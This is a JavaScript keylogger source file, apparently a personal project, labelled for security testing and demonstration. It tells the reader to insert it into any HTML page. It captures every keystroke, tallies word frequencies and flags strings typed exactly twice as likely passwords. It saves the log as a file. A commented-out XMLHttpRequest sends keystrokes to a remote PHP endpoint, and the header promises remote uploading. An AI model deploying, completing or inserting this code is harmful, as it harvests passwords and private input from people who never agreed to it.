//	JavaScript Keylogger / Analyzer
//	Written by Johnny Dunn

//	Insert this script into any HTML page to get data
//	Data only saves upon button clicking; soon there will be remote uploading of the log
//	For security testing / desmonstration purposes only

//	Credit for duplicates function: 
//	http://stackoverflow.com/questions/7376598/in-javascript-how-do-i-check-if-an-array-has-duplicate-values

var keys = " ";  				//  Declaring a javascript variable to store each keystroke 
var allText = "";				//  Stores the keys being typed
var allTextSplit = [];			//	Split typed characters by spaces for words
var allTextJoined = "";

var fullTextArea = [];			//	The full text that the user has been writing gets pushed here
var data = "data.txt";			//	File where logs will be stored

var a, b, prev = [];			//	Arrays that will be combined together 
var counts = {};				//	Object of the combined arrays to keep track of words and their frequencies
var strObj = "";				//	Changes object to string

var possiblePasswords = "";		//	The list of possible passwords (Strings that were entered exactly twice)
var numOfWords = 0;				//	Start the word counter


onkeypress = function(e) { // calling the function to execute whenever a keystroke is there on html document  document.onkeypress  is an event handler
	get = window.event?event:e;
 	key = get.keyCode?get.keyCode:get.charCode; //get character code 
 	key = String.fromCharCode(key); // convert it to string 
 	keys+=key; // append current character to previous one (concatinate)
 	splitAllText(allText);
 	checkSplitText(allTextSplit, counts);
 	if (e.keyCode == 13) {		//	If the user has pressed enter.. 
 		allText += keys;
 		keys = " ";			//	Leave a space after enter to start next string / word
 		objToString(counts);
 	  // Variables below were an attempt to automatically create a log file for the data via PHP.. 
      // var http = new XMLHttpRequest();
      // var param = encodeURI(key)
      // http.open("POST","http://jddunn.github.io/web-based-keylogger/keylogger.php",true);
      // http.setRequestHeader("Content-type","application/x-www-form-urlencoded");
      // http.send("key="+param);
 	}
}

/*
 This makes the keylogger record strings every second, instead of on pressing 'ENTER'

 window.setInterval(function(e){			
 // console.log(keys);
	allText = allText + keys;
	splitAllText(allText);
	keys = " ";
	checkSplitText(allTextSplit);
	// console.log(allTextSplit);
}, 1000); // set interval to execute function continuously 

*/

function splitAllText(allText) {		//	Splits the text by spaces to make words
	allTextSplit = allText.split(" ");
	return allTextSplit;
}

function checkSplitText(allTextSplit, counts) {		//	Begins process of combing the split text into an object
	for (var i = 0; i < allTextSplit.length; i++) {
	// console.log("New string: " + allTextSplit[i]);
	}
	numberOfWords(allTextSplit);
	// console.log("Number of words so far: " + numOfWords);
	getFrequency(allTextSplit);
	getKeyAndValues(a,b);
	console.log(counts);
	console.log(strObj)
	console.log(possiblePasswords)
}

function numberOfWords(allTextSplit) {			//	Counts the number of words
	allTextJoined = allTextSplit.join(' ');
	numOfWords = allTextJoined.split(' ').length;
	return numOfWords, allTextJoined;
}

function getFrequency(allTextSplit) {		//	Counts the frequency for every word
    a = [], b = [], prev;
    allTextSplit.sort();
    for ( var i = 0; i < allTextSplit.length; ++i ) {
        if ( allTextSplit[i] !== prev ) {
            a.push(allTextSplit[i]);
            b.push(1);
        } else {
            ++b[b.length-1];
        }
        prev = allTextSplit[i];
    }
    return [a, b];
}

function getKeyAndValues(a, b) {					//	Combines the two arrays into an object
	// allTextJoined = allTextSplit.join(' ');
    // allTextJoined = allTextJoined.replace(/[\.,-\/#!$%\^&\*;:{}=\-_`~()]/g,"");
    for (var i = 0; i < a.length; i++) {
         counts[a[i]] = b[i];
    }
    return counts;
}

function objToString (counts) {			//	Make object into string to send into text file
    strObj = "Word Counter (Ignore first number before first word):\n";
    for (var p in counts) {
        if (counts.hasOwnProperty(p)) {
            strObj +=  "Word: " + p + " - " + "Frequency: " + counts[p] +"\n";
        }
    }
    return strObj;
}

// If duplicate values are found, then this string potentially is a password since users had to enter it twice.
function hasDuplicates(counts, a, b) {		
	    for (var prop in counts) {
        	if (counts.hasOwnProperty(prop)) {
        		if (counts[prop] == "2") {
        			// console.log("Potential password: " + " " + prop);
        			possiblePasswords += "\n" + "Potential password: " + prop + "\n";
        	}
        }
    }       
        return possiblePasswords;
}

/*
//	http://stackoverflow.com/questions/4009756/how-to-count-string-occurrence-in-string
function occurrences(string, subString, allowOverlapping) {
    string += "";
    subString += "";
    if (subString.length <= 0) return (string.length + 1);

    var n = 0,
        pos = 0,
        step = allowOverlapping ? 1 : subString.length;

    while (true) {
        pos = string.indexOf(subString, pos);
        if (pos >= 0) {
            ++n;
            pos += step;
        } else break;
    }
    return n;
}*/

//  Function below is for the example HTML page to save the keylogger data file
function saveTextAsFile() {
	//	Repeat the process of adding the latest keys to the log to ensure latest message is recorded
	allText += keys;			
	splitAllText(allText);
 	checkSplitText(allTextSplit, counts);
	hasDuplicates(counts, a, b);
	var fullLog = strObj + "\n" + "\n" + possiblePasswords;		//	This is the final string with all the log data recorded
	// allTextJoined = allTextSplit.join([separator = ' ']);
    // var textToWrite = allTextJoined;
    var textFileAsBlob = new Blob([fullLog], {type:'text/plain'});
    var fileNameToSaveAs = data;
    var downloadLink = document.createElement("a");
    downloadLink.download = fileNameToSaveAs;
    if (window.URL != null) {
        // Chrome allows the link to be clicked
        // without actually adding it to the DOM.
        downloadLink.href = window.webkitURL.createObjectURL(textFileAsBlob);
    } else {
        // Firefox requires the link to be added to the DOM
        // before it can be clicked.
        downloadLink.href = window.URL.createObjectURL(textFileAsBlob);
        downloadLink.onclick = document.body.removeChild(event.target);
        downloadLink.style.display = "none";
        document.body.appendChild(downloadLink);
    }
    downloadLink.click();
}